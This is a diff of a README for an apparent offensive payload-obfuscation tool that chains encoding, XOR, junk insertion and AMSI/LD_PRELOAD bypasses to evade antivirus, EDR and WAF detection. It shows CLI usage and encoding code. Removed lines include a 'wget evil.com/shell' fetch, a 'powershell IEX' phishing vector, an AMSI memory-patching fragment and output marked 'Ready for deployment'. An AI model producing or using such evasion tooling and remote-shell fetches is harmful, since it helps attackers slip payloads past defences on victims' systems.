@@ -11,23 +11,15 @@ Professional-grade payload obfuscation framework with 7 evasion layers that chai
 ### 7-Layer Evasion Chain
 1. **Unicode Cloak** - Zero-width spaces break pattern matching
 2. **Base64 Armor** - Multi-layer encoding with padding manipulation  
-3. **XOR Encryption** - Repeating key encryption (OverTheWire style)
+3. **XOR Encryption** - Repeating key encryption
 4. **Junk Scatter** - Random character insertion (40% density)
 5. **Fragmentation** - Split payloads with reassembly
-6. **Polyglot Mixing** - Multi-attack format support
-7. **OS Bypass** - AMSI (Windows) + LD_PRELOAD (Linux)
+6. **OS Bypass** - AMSI (Windows) + LD_PRELOAD (Linux)
 
 ### Detection Engine Testing
-- **AV Engines:** Windows Defender, ClamAV, Kaspersky, Norton, McAfee
+- **AV Engines:** Windows Defender, ClamAV, Kaspersky
 - **EDR Systems:** Memory execution, API hooking detection
 - **WAF Bypass:** Web application firewall evasion
-- **Falco Rules:** Container security bypass
-
-### Professional Reporting
-- Executive summary with evasion scores
-- JSON export for integration
-- Color-coded results (🟢 CLEAN, 🟡 PARTIAL, 🔴 DETECTED)
-- Tactical recommendations
 
 ## 📁 Project Structure
 
@@ -45,10 +37,13 @@ advanced_payload_framework/
 ├── bypasses/
 │   ├── amsi_windows.py  # Windows AMSI bypass
 │   └── ld_preload_linux.py # Linux library injection
-├── tester.py           # AV/EDR/WAF simulation
+├── utils.py            # Utility functions
 ├── reporter.py         # Executive reports
-├── sample_payloads/    # Real test payloads
+├── sample_payloads/    # Test payloads
+│   └── basic.txt       # Contains "whoami"
 ├── setup.sh           # Installation script
+├── LICENSE            # MIT License
+├── .gitignore         # Git ignore rules
 └── README.md          # This file
 ```
 
@@ -57,11 +52,12 @@ advanced_payload_framework/
 ### Prerequisites
 - Python 3.6+
 - GCC compiler (for Linux bypasses)
-- Kali Linux recommended
+- Linux/macOS recommended
 
 ### Installation
 ```bash
-# Clone or download the framework
+# Clone the repository
+git clone <repository-url>
 cd advanced_payload_framework
 
 # Run setup script
@@ -72,77 +68,43 @@ chmod +x setup.sh
 python3 main.py --help
 ```
 
-## 💻 Usage Examples
+## 💻 Usage
 
 ### Basic Commands
 ```bash
-# Simple obfuscation
-python3 main.py --payload "whoami" --chain basic --variants 3
+# Process payload from file
+python3 main.py --file sample_payloads/basic.txt --chain basic --variants 3
 
-# Full stealth mode with testing
-python3 main.py --payload "whoami" --chain full --variants 10 --test
+# Direct payload input
+python3 main.py --payload "whoami" --chain stealth --variants 5
 
-# Windows-specific targeting
-python3 main.py --payload "powershell Get-Process" --target windows --variants 5
+# Full obfuscation chain
+python3 main.py --file sample_payloads/basic.txt --chain full --variants 10
 
-# Linux-specific with AV testing
-python3 main.py --payload "wget evil.com/shell" --target linux --test-av
+# Target-specific obfuscation
+python3 main.py --payload "whoami" --target windows --variants 5
 ```
 
 ### Advanced Usage
 ```bash
-# Phishing vector optimization
-python3 main.py --payload "powershell IEX..." --vector phishing --variants 20
+# Generate comprehensive variants
+python3 main.py --payload "whoami" --chain full --variants 20
 
-# Generate comprehensive report
-python3 main.py --payload "netstat -an" --chain stealth --output reports/analysis.json
+# Save results to JSON
+python3 main.py --file sample_payloads/basic.txt --chain stealth --output results.json
 
-# Test specific payload category
-python3 main.py --payload "$(cat sample_payloads/windows.txt)" --chain full --test
+# Test against detection engines
+python3 main.py --payload "whoami" --chain stealth --test
 ```
 
 ### Command Line Options
-- `--payload` - Target payload to obfuscate (required)
+- `--payload` - Direct payload string to obfuscate
+- `--file` - Path to payload file (e.g., sample_payloads/basic.txt)
 - `--chain` - Obfuscation chain: basic/stealth/full (default: stealth)
 - `--target` - Target OS: windows/linux/both (default: both)
 - `--variants` - Number of variants to generate (default: 5)
-- `--vector` - Attack vector: phishing/web/network
 - `--test` - Test against detection engines
-- `--test-av` - Detailed AV engine testing
 - `--output` - Save results to JSON file
-
-## 📊 Sample Output
-
-```
-🎯 Advanced Payload Obfuscation Framework
-==================================================
-Target: whoami
-🔗 Chain: unicode → base64 → xor → junk → amsi
-
-🔄 Generating 5 variants...
-Variant 1: 95% evasion ✅ CLEAN
-Variant 2: 87% evasion ✅ CLEAN  
-Variant 3: 76% evasion ⚠️ PARTIAL
-Variant 4: 92% evasion ✅ CLEAN
-Variant 5: 89% evasion ✅ CLEAN
-
-🏆 BEST: Variant 1 - 95% evasion
-Ready for deployment: dGVzdA==...
-
-🛡️ AV Engine Testing...
-Windows Defender: 94% evasion ✅ CLEAN
-ClamAV: 91% evasion ✅ CLEAN
-Kaspersky: 88% evasion ✅ CLEAN
-```
-
-## 🎓 Educational Use Cases
-
-### Research Applications
-- AV/EDR evasion research
-- Obfuscation technique analysis
-- Detection engine testing
-- Security tool evaluation
-- Cybersecurity education and training
 
 ## 🔬 Technical Deep Dive
 
@@ -165,14 +127,6 @@ encoded = base64.b64encode(base64.b64encode(original.encode())).decode()
 # Repeating key XOR with latin1 encoding
 key = "cyber"
 xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
-```
-
-### Layer 7: AMSI Bypass
-```powershell
-# Memory patching technique
-$a = [Ref].Assembly.GetTypes()
-$b = $a | Where-Object {$_.Name -like "*iUtils"}
-# ... memory manipulation
 ```
 
 ## 🛡️ Detection Evasion Techniques
